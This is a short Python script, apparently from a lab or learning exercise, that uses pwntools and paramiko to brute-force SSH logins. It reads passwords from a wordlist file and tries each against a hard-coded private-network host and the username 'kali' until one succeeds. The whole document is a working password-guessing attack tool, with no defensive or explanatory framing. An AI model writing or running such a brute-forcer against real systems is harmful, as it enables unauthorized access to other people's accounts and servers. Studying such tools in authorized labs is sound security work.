from pwn import *
import paramiko

host = "192.168.123.146" #modify host and username as you need
username ="kali"
attempts=0

with open( "ssh-common-passwords.txt", "r") as password_list: #specify wordlist
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response. connected():
				print( "[>] Valid password found:'{}''!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1
